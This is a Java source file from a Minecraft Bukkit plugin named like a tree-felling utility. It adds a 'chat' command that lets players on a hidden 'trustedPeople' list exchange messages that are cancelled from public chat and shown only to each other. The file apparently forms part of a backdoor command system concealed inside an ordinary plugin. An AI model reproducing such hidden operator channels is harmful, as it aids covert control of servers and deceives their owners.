package me.bow.treecapitatorultimate.commands.Miscs;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Tuple;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.UUID;

@Command.Info(command = "chat", description = "Self-explanatory", category = CommandCategory.Miscs)
public class Chat extends Command {
    public static HashMap<UUID, Tuple<Character, ChatColor>> triggers = new HashMap<>();

    public static ChatColor generateColorFromUUID(UUID uuid) {
        return ChatColor.getByChar(Integer.toHexString(uuid.hashCode() % 17));
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (args.isEmpty()) {
            if (triggers.containsKey(p.getUniqueId())) {
                triggers.remove(p.getUniqueId());
                this.Reply(p, ChatColor.RED + "Chat disabled");
            } else {
                this.Reply(p, ChatColor.RED + "You have chat already disabled!");
            }
        } else {
            char c = args.get(0).charAt(0);
            if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || Character.isDigit(c)) {
                this.Reply(p, ChatColor.LIGHT_PURPLE + "And how do you think you'll type normally in chat?");
                return;
            } else if (c == Start.COMMAND_SIGN || c == '/') {
                this.Reply(p, ChatColor.LIGHT_PURPLE + "And how do you think you'll use commands?");
                return;
            }
            Chat.triggers.put(p.getUniqueId(), new Tuple<>(c, Chat.generateColorFromUUID(p.getUniqueId())));
            this.Reply(p, ChatColor.GREEN + "Chat enabled!\nType to chat by prepending " + c + " in front of your message!");
        }
    }

    @Override
    public void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().length() <= 0) return;
        if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) return;
        Tuple<Character, ChatColor> trigger = triggers.get(p.getUniqueId());
        if (trigger == null) return;
        if (!e.getMessage().startsWith(String.valueOf(trigger.a()))) return;
        e.setCancelled(true);
        e.setMessage(e.getMessage().substring(1));
        ChatColor color = trigger.b();
        for (Player pe : Bukkit.getOnlinePlayers()) {
            if (!Start.Instance.trustedPeople.contains(pe.getUniqueId())) continue;
            pe.sendMessage(Start.COMMAND_PREFIX + color + p.getDisplayName() + ": " + ChatColor.RESET + e.getMessage());
        }
    }
}
